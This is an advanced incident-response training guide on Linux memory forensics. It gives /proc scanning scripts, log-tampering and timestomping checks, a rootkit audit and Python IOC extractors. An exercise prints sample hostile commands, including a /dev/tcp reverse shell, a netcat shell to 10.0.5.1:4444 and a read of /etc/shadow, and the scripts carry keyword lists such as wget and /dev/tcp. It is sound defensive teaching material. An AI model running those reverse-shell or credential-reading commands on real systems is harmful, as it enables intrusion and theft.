# Guide 01 (Advanced): Memory Forensics and Anti-Forensics Detection

**Level:** Advanced

**Estimated time:** 75 minutes

**Prerequisites:** Intermediate guides (OS Forensics, Persistence Hunting), familiarity with Python, comfort with raw log/artifact analysis

---

## Objective

By the end of this guide you will be able to:

* Capture and analyze Linux memory artifacts using `/proc` filesystem
* Detect process injection, hollow processes, and rootkit indicators
* Identify anti-forensics techniques (log wiping, timestomping, hidden files)
* Extract Indicators of Compromise (IOCs) programmatically from OS artifacts
* Apply memory-resident threat hunting techniques without a dedicated memory acquisition tool

---

## Background

Standard disk-based forensics misses a wide class of threats:

| Technique | Bypasses disk forensics? | Leaves memory evidence? |
|-----------|--------------------------|-------------------------|
| Fileless malware (PowerShell IEX) | Yes | Yes |
| Reflective DLL injection | Yes | Yes |
| Process hollowing | Partially | Yes |
| Rootkit (kernel module) | Yes | Partially |
| Log wiper | N/A — destroys evidence | Leaves gaps/timestamps |
| Timestomping | Yes — changes mtime | Metadata inconsistency |

---

## Part A: Linux Memory Forensics via `/proc`

The `/proc` filesystem exposes live process memory without requiring a full RAM dump.

### A.1: Process Memory Maps

```bash
# List all running processes with their memory mappings
# Focus on processes with anonymous executable pages (common with injected shellcode)

echo "=== Processes with anonymous executable mappings ==="
for pid in $(ls /proc | grep '^[0-9]'); do
    maps="/proc/$pid/maps"
    [ -f "$maps" ] || continue
    comm=$(cat /proc/$pid/comm 2>/dev/null)

    # Executable anonymous pages: rwx or r-x with no backing file
    anon_exec=$(grep -c '^[0-9a-f]*-[0-9a-f]* r.x. .* 00:00 0 *$' "$maps" 2>/dev/null || true)
    if [ "$anon_exec" -gt 0 ]; then
        echo "  PID $pid ($comm): $anon_exec anonymous executable page(s)  *** SUSPICIOUS ***"
    fi
done
```

```bash
# Examine a specific process memory map
# Replace PID with a suspicious process ID from the previous output
PID=1234

echo "=== Memory map for PID $PID ==="
cat /proc/$PID/maps

echo ""
echo "=== Open file descriptors ==="
ls -la /proc/$PID/fd 2>/dev/null

echo ""
echo "=== Network connections held by this PID ==="
cat /proc/$PID/net/tcp 2>/dev/null | awk '
NR==1 { print "  Local Address          Remote Address         State" }
NR>1  {
    split($2, la, ":"); split($3, ra, ":")
    # Convert hex to decimal for port
    cmd = "printf \"%d.%d.%d.%d\" 0x" substr(la[1],7,2) " 0x" substr(la[1],5,2) " 0x" substr(la[1],3,2) " 0x" substr(la[1],1,2)
    cmd | getline lip; close(cmd)
    lport = strtonum("0x" la[2])
    # Simplified: just print hex
    printf "  %s:%-6s  %s:%-6s\n", la[1], lport, ra[1], strtonum("0x" ra[2])
}'
```

### A.2: Deleted-but-Running Executables

A classic anti-forensics technique: run a malicious binary, then delete it from disk.
The process continues running but `ls /proc/PID/exe` points to a deleted path.

```bash
echo "=== Processes running from deleted executables ==="
for pid in $(ls /proc | grep '^[0-9]'); do
    exe_link="/proc/$pid/exe"
    [ -L "$exe_link" ] || continue
    exe_path=$(readlink "$exe_link" 2>/dev/null || true)
    if echo "$exe_path" | grep -q ' (deleted)$'; then
        comm=$(cat /proc/$pid/comm 2>/dev/null || echo "?")
        echo "  PID $pid ($comm): running from DELETED file: $exe_path"
    fi
done
```

```bash
# Recover the binary of a deleted-but-running process
# This works because the kernel keeps the file open even after unlink()
PID=1234
echo "Recovering binary for PID $PID to /tmp/recovered_exe"
cp /proc/$PID/exe /tmp/recovered_exe
file /tmp/recovered_exe
sha256sum /tmp/recovered_exe
# Now you can submit the hash to VirusTotal or extract strings
strings /tmp/recovered_exe | grep -E 'http|/tmp|/dev/tcp|bash|python' | head -20
```

### A.3: String Extraction from Process Memory

```bash
# Extract printable strings from a live process's memory regions
# Use with caution on production systems — reads the full heap/stack
PID=1234
STRINGS_OUT="/tmp/proc_strings_${PID}.txt"

echo "Extracting strings from PID $PID memory..."
strings /proc/$PID/mem 2>/dev/null > "$STRINGS_OUT" || true
# Note: direct /proc/PID/mem reads require ptrace privileges

# Alternative: extract from /proc/PID/maps regions using dd
while IFS=' ' read -r addr_range rest; do
    IFS='-' read -r start end <<< "$addr_range"
    # Only readable pages
    perms=$(echo "$rest" | awk '{print $1}')
    [[ "$perms" != r* ]] && continue
    start_dec=$((16#$start))
    end_dec=$((16#$end))
    size=$((end_dec - start_dec))
    [ "$size" -le 0 ] && continue
    [ "$size" -gt $((50 * 1024 * 1024)) ] && continue  # skip huge regions
    dd if=/proc/$PID/mem bs=1 skip="$start_dec" count="$size" 2>/dev/null | strings -n 6
done < /proc/$PID/maps 2>/dev/null | sort -u | grep -E '(http|/tmp|socket|bash|python|wget|curl|base64)' | head -40
```

---

## Part B: Anti-Forensics Detection

### B.1: Log Tampering — Detecting Gaps and Truncation

Attackers commonly run `> /var/log/auth.log`, `history -c`, or use `shred`.

```bash
echo "=== Log integrity checks ==="

# 1. Check for suspiciously small or empty log files
for logfile in /var/log/auth.log /var/log/syslog /var/log/kern.log; do
    if [ -f "$logfile" ]; then
        size=$(stat -c '%s' "$logfile")
        mtime=$(stat -c '%y' "$logfile")
        if [ "$size" -lt 100 ]; then
            echo "  *** SUSPICIOUS: $logfile is only $size bytes (mtime: $mtime) — may have been wiped"
        else
            echo "  OK: $logfile ($size bytes, last modified: $mtime)"
        fi
    fi
done

# 2. Look for timestamp gaps in auth.log (days with zero entries)
echo ""
echo "=== auth.log entries per day ==="
awk '{print $1, $2}' /var/log/auth.log 2>/dev/null | sort | uniq -c | sort -k3,3 -k4,4n | \
  awk '{printf "  %s %s %s: %d entries\n", $3, $4, $5, $1}' 2>/dev/null || \
  awk '{print $1" "$2}' /var/log/auth.log | sort | uniq -c

# 3. Detect history file tampering
echo ""
echo "=== Shell history file checks ==="
for home in /root /home/*; do
    for hist in .bash_history .zsh_history .sh_history; do
        histfile="$home/$hist"
        [ -f "$histfile" ] || continue
        size=$(stat -c '%s' "$histfile")
        mtime=$(stat -c '%Y' "$histfile")
        now=$(date +%s)
        age=$(( (now - mtime) / 60 ))
        lines=$(wc -l < "$histfile")
        echo "  $histfile: $lines lines, $size bytes, modified ${age} minutes ago"
        if [ "$lines" -lt 5 ] && [ "$size" -lt 50 ]; then
            echo "    *** SUSPICIOUS: nearly empty history — 'history -c' or redirect may have been used"
        fi
        # Check if HISTFILE was pointed to /dev/null
        if grep -q 'HISTFILE=/dev/null' "$home/.bashrc" 2>/dev/null || \
           grep -q 'HISTFILE=/dev/null' "$home/.bash_profile" 2>/dev/null; then
            echo "    *** SUSPICIOUS: HISTFILE=/dev/null found in profile files"
        fi
    done
done
```

### B.2: Timestomping Detection

Timestomping changes `mtime` to blend malicious files with legitimate ones.
The inconsistency between `mtime`, `ctime`, and `atime` is the tell.

```bash
echo "=== Timestomping indicators ==="
echo "(Files where ctime is significantly newer than mtime)"
echo ""

# ctime cannot be modified by userspace tools — it always reflects the last metadata change.
# If mtime shows an old date but ctime is recent, the file was likely timestomped.

find /tmp /var/tmp /dev/shm /usr/local/bin /opt 2>/dev/null -type f | while read -r f; do
    mtime=$(stat -c '%Y' "$f" 2>/dev/null)  # modification time (settable)
    ctime=$(stat -c '%Z' "$f" 2>/dev/null)  # change time (kernel-controlled)
    [ -z "$mtime" ] || [ -z "$ctime" ] && continue

    diff=$(( ctime - mtime ))
    # Flag if ctime is more than 1 hour newer than mtime
    if [ "$diff" -gt 3600 ]; then
        mtime_h=$(stat -c '%y' "$f" 2>/dev/null | cut -d. -f1)
        ctime_h=$(stat -c '%z' "$f" 2>/dev/null | cut -d. -f1)
        echo "  TIMESTOMP CANDIDATE: $f"
        echo "    mtime (settable): $mtime_h"
        echo "    ctime (kernel):   $ctime_h"
        echo "    Difference:       ${diff}s"
    fi
done
```

### B.3: Hidden Files and Directories

```bash
echo "=== Hidden files in unusual locations ==="

# Hidden files (dot-prefixed) outside home directories
find /tmp /var/tmp /opt /usr/local /dev/shm 2>/dev/null -name '.*' -type f | while read -r f; do
    echo "  HIDDEN FILE: $f"
    echo "    $(file "$f" 2>/dev/null)"
    echo "    $(ls -la "$f" 2>/dev/null)"
done

# Files with unusual or invisible names (spaces, Unicode, etc.)
echo ""
echo "=== Files with unusual names (non-printable chars, leading spaces) ==="
find /tmp /var/tmp /opt 2>/dev/null -maxdepth 3 | while read -r f; do
    name=$(basename "$f")
    if echo "$name" | grep -qP '[^\x20-\x7e]'; then
        echo "  NON-ASCII FILENAME: $f"
    fi
    if echo "$name" | grep -q '^ '; then
        echo "  LEADING-SPACE FILENAME: $f"
    fi
done

# Large files in /tmp that are not world-readable (hiding data)
echo ""
echo "=== Unusual large files in /tmp ==="
find /tmp /var/tmp /dev/shm 2>/dev/null -type f -size +1M | while read -r f; do
    size=$(du -sh "$f" 2>/dev/null | cut -f1)
    perm=$(stat -c '%a' "$f" 2>/dev/null)
    echo "  LARGE FILE: $f ($size, mode $perm)"
    echo "    $(file "$f" 2>/dev/null)"
done
```

---

## Part C: Rootkit Indicators

### C.1: Process Hiding Detection

Rootkits hide processes by unhooking the kernel's process list.
A classic detection: compare `ps` output with `/proc` entries.

```bash
echo "=== Rootkit check: ps vs /proc discrepancy ==="

PS_PIDS=$(ps -eo pid --no-headers | tr -d ' ' | sort -n)
PROC_PIDS=$(ls /proc | grep '^[0-9]' | sort -n)

echo "PIDs in /proc but NOT in ps output (possible hidden processes):"
HIDDEN=0
while IFS= read -r pid; do
    if ! echo "$PS_PIDS" | grep -qx "$pid"; then
        comm=$(cat /proc/$pid/comm 2>/dev/null || echo "?")
        echo "  HIDDEN PID $pid ($comm)"
        HIDDEN=$((HIDDEN+1))
    fi
done <<< "$PROC_PIDS"

if [ "$HIDDEN" -eq 0 ]; then
    echo "  None found. (No userspace rootkit hiding processes detected)"
fi
```

### C.2: Kernel Module Audit

Malicious kernel modules (LKMs) are the most powerful rootkits.

```bash
echo "=== Loaded kernel modules ==="
lsmod | sort

echo ""
echo "=== Modules NOT in expected module list ==="
# Baseline: list modules typical for a standard Ubuntu 22.04 server
# In production, compare against a known-good snapshot
EXPECTED_MODULES="ip_tables x_tables xt_conntrack nf_conntrack ip6_tables overlay br_netfilter"

lsmod | awk 'NR>1 {print $1}' | while read -r mod; do
    is_expected=0
    for exp in $EXPECTED_MODULES; do
        [ "$mod" = "$exp" ] && is_expected=1 && break
    done
    # Check if the module has a signed certificate
    signed=$(modinfo "$mod" 2>/dev/null | grep 'sig_key' | wc -l)
    if [ "$is_expected" -eq 0 ] && [ "$signed" -eq 0 ]; then
        echo "  REVIEW: $mod (unsigned, not in expected list)"
        modinfo "$mod" 2>/dev/null | grep -E 'filename|description|author' | sed 's/^/    /'
    fi
done
```

### C.3: Syscall Table Integrity (Linux)

A kernel rootkit often patches the syscall table.
Without a specialised tool like `kAFL` or `unhide`, the best we can do from userspace is look for telltale signs.

```bash
echo "=== /proc/kallsyms syscall table check ==="
# Requires root; prints addresses of key syscalls
# On a rootkit-infected system, these may point outside the kernel's legitimate range

if [ -r /proc/kallsyms ]; then
    grep ' sys_call_table\| __x64_sys_execve\| __x64_sys_open' /proc/kallsyms | head -10
    echo ""
    echo "Compare these addresses against a known-good snapshot."
    echo "Addresses that fall outside the kernel .text range indicate hooking."
else
    echo "  /proc/kallsyms not readable (requires root)."
fi
```

---

## Part D: Automated IOC Extraction

### D.1: Python IOC Extractor

Run the inline script to extract IOCs from a collection of log files:

```bash
python3 - << 'PYEOF'
"""
ioc_extract.py — inline IOC extractor for log files.
Extracts IPv4 addresses, domains, file hashes, file paths, and
known-bad process names from any text input.
"""
import re
import sys
import os
from collections import Counter

LOG_DIRS = ["/var/log", "/evidence/logs"]
SUSPICIOUS_PATHS = ["/tmp", "/dev/shm", "/var/tmp", "/proc/self"]
LOLBINS = {"certutil", "mshta", "regsvr32", "bitsadmin", "wscript",
           "cscript", "runscripthelper", "msiexec", "rundll32"}

# Patterns
RE_IPV4   = re.compile(r'\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b')
RE_DOMAIN = re.compile(r'\b(?:[a-z0-9](?:[a-z0-9\-]{0,61}[a-z0-9])?\.)+(?:com|net|org|io|ru|cn|xyz|tk|top|cc)\b', re.I)
RE_MD5    = re.compile(r'\b[0-9a-fA-F]{32}\b')
RE_SHA256 = re.compile(r'\b[0-9a-fA-F]{64}\b')
RE_PATH_WIN  = re.compile(r'[Cc]:\\(?:Users|Windows|ProgramData|Temp)[\\A-Za-z0-9._\- ]+')
RE_PATH_LIN  = re.compile(r'(?:/tmp|/dev/shm|/var/tmp)/[^\s\'"]+')

def collect_lines():
    lines = []
    for d in LOG_DIRS:
        if not os.path.isdir(d):
            continue
        for root, _, files in os.walk(d):
            for fn in files:
                fpath = os.path.join(root, fn)
                try:
                    with open(fpath, errors='replace') as f:
                        lines += f.readlines()
                except Exception:
                    pass
    return lines

def extract(lines):
    ips, domains, hashes, paths = Counter(), Counter(), Counter(), Counter()
    for line in lines:
        for ip in RE_IPV4.findall(line):
            if not ip.startswith(('127.', '0.', '255.')):
                ips[ip] += 1
        for d in RE_DOMAIN.findall(line):
            domains[d.lower()] += 1
        for h in RE_MD5.findall(line) + RE_SHA256.findall(line):
            hashes[h] += 1
        for p in RE_PATH_WIN.findall(line) + RE_PATH_LIN.findall(line):
            paths[p] += 1
    return ips, domains, hashes, paths

print("=== IOC EXTRACTION REPORT ===\n")
lines = collect_lines()
print(f"Lines analysed: {len(lines):,}\n")

ips, domains, hashes, paths = extract(lines)

print("--- IPv4 Addresses (top 20) ---")
for ip, count in ips.most_common(20):
    rfc1918 = any(ip.startswith(p) for p in ('10.', '172.', '192.168.'))
    flag = " (EXTERNAL)" if not rfc1918 else ""
    print(f"  {count:>6}×  {ip}{flag}")

print("\n--- Suspicious Domains ---")
for dom, count in domains.most_common(20):
    print(f"  {count:>6}×  {dom}")

print("\n--- File Hashes (MD5/SHA256) ---")
for h, count in hashes.most_common(10):
    print(f"  {count:>6}×  {h}")

print("\n--- Suspicious File Paths ---")
for p, count in paths.most_common(20):
    print(f"  {count:>6}×  {p}")

PYEOF
```

### D.2: Automated Timeline Builder

```bash
# Build a chronological timeline from all available log sources
# Correlates auth.log, syslog, audit.log by timestamp

python3 - << 'PYEOF'
import re, os, sys
from datetime import datetime

LOG_FILES = [
    "/var/log/auth.log",
    "/var/log/syslog",
    "/var/log/audit/audit.log",
    "/var/log/kern.log",
]

# Syslog-style: Jan 15 03:47:06
RE_SYSLOG = re.compile(r'^(\w{3}\s+\d+\s+\d{2}:\d{2}:\d{2})')
# auditd: msg=audit(1705283003.001:1001)
RE_AUDIT  = re.compile(r'msg=audit\((\d+\.\d+):')
# ISO: 2024-01-15T03:43:01
RE_ISO    = re.compile(r'(\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2})')

YEAR = datetime.now().year

events = []
for logfile in LOG_FILES:
    if not os.path.exists(logfile):
        continue
    source = os.path.basename(logfile)
    with open(logfile, errors='replace') as f:
        for line in f:
            line = line.rstrip()
            ts = None
            m = RE_SYSLOG.match(line)
            if m:
                try:
                    ts = datetime.strptime(f"{YEAR} {m.group(1)}", "%Y %b %d %H:%M:%S")
                except ValueError:
                    pass
            if ts is None:
                m = RE_AUDIT.search(line)
                if m:
                    ts = datetime.fromtimestamp(float(m.group(1)))
            if ts is None:
                m = RE_ISO.search(line)
                if m:
                    try:
                        ts = datetime.fromisoformat(m.group(1))
                    except ValueError:
                        pass
            if ts:
                events.append((ts, source, line[:120]))

events.sort(key=lambda x: x[0])

print(f"{'Timestamp':<22} {'Source':<15} {'Event'}")
print("-" * 80)
for ts, src, line in events:
    # Highlight malicious indicators
    suspicious = any(kw in line.lower() for kw in
        ['failed', 'error', 'invalid', 'attack', 'brute', 'deny',
         'wget', '/tmp/', 'sudo', 'useradd', 'adduser', 'backdoor', 'execve'])
    flag = " ***" if suspicious else ""
    print(f"{ts.strftime('%Y-%m-%d %H:%M:%S'):<22} {src:<15} {line[:80]}{flag}")

print(f"\nTotal events: {len(events)}")
PYEOF
```

---

## Part E: Exercise — Identify the Malware Technique

Given the following process listing, identify each malicious technique:

```text
PID   PPID  USER      CMD
1     0     root      /sbin/init
800   1     root      /usr/sbin/sshd
1050  800   root      sshd: alice [priv]
1051  1050  alice     sshd: alice@pts/0
1052  1051  alice     bash
1055  1052  alice     python3 -c "import pty; pty.spawn('/bin/bash')"
1060  1052  alice     bash
1100  1060  alice     cat /etc/shadow
1200  1     root      [kworker/u4:2]
1201  1     root      [kworker/u4:2]   <-- duplicate kworker PID!
2100  1     www-data  nginx: worker process
2101  2100  www-data  bash -c "bash -i >& /dev/tcp/10.0.5.1/4444 0>&1"
2102  2101  www-data  nc -e /bin/bash 10.0.5.1 4444
9999  1     root      python3 /dev/fd/4  <-- executing from file descriptor
```

**Questions:**

1. Which PID is a **web shell** execution chain? What is the parent-child relationship that reveals this?
2. PID 1055 (`python3 -c "import pty..."`). What technique is this? Why do attackers do it?
3. PIDs 1200 and 1201 both show `[kworker/u4:2]`. What does this indicate?
4. PID 9999 is executing from `/dev/fd/4`. What anti-forensics technique is this?
5. What command would you run to capture the binary at PID 9999 for analysis?

**Model answers:**

1. **PID 2101–2102**: `nginx worker → bash → nc` is a classic web shell execution chain.
   `www-data` spawning `bash` directly is never legitimate — nginx workers run PHP/Python
   via FastCGI, never raw shell children. The `-c "bash -i >& /dev/tcp..."` confirms a
   reverse shell being launched via a web shell command parameter.

2. **PTY upgrade** (T1059.004). After getting a non-interactive shell via the web shell,
   the attacker runs `python3 -c "import pty; pty.spawn('/bin/bash')"` to get a fully
   interactive terminal with job control. This makes it easier to run interactive tools
   (e.g., `sudo`, `vim`, `ssh`).

3. **Duplicate kernel thread name is a rootkit indicator.** Legitimate `[kworker]` threads
   have unique identifiers. A rootkit may spawn a process and rename it to look like a
   kernel thread (`prctl(PR_SET_NAME, "[kworker/u4:2]")`). The duplicate name, the fact
   that kernel threads always have PPID=2 (kthreadd) not PPID=1, and UID=root with no
   cgroup/namespace are indicators. Check: `cat /proc/1201/status | grep PPid`.

4. **Memfd / file-descriptor execution**: the attacker created an anonymous file descriptor
   (`memfd_create`) or used `fd` tricks to load and execute a binary entirely from RAM
   without touching the filesystem. This bypasses path-based AV/EDR rules and leaves no
   on-disk artefact. The executable exists only in the process's memory.

5. `cp /proc/9999/exe /tmp/recovered_9999 && file /tmp/recovered_9999 && sha256sum /tmp/recovered_9999`
   The kernel keeps a reference to the executable even when the underlying file is deleted
   or was never on disk — `/proc/PID/exe` is the canonical way to recover it.

---

## Summary

| Technique | Detection Method | Tool/Command |
|-----------|-----------------|--------------|
| Fileless execution | `/proc/PID/exe` points to `(deleted)` | `readlink /proc/*/exe` |
| Process injection (anon rwx pages) | `/proc/PID/maps` — anonymous +x pages | `grep` maps for `rwx.*00:00 0` |
| Log wiping | File size near-zero, timestamp gap | `stat`, `wc -l` |
| Timestomping | ctime >> mtime | `stat -c '%Y %Z'` + diff |
| Hidden processes | `/proc` vs `ps` discrepancy | compare `ls /proc` vs `ps` PIDs |
| Kernel module rootkit | `lsmod` unsigned modules | `lsmod` + `modinfo` |
| Memfd execution | `/proc/PID/exe` = `/dev/fd/N` | `readlink /proc/*/exe` |

**Key takeaway**: An attacker who has compromised a system will try to erase their tracks.
Memory-resident artifacts and kernel metadata (`ctime`, `/proc` filesystem, syscall table
addresses) are far harder to falsify than disk artifacts, making them critical evidence
sources in advanced incident response.
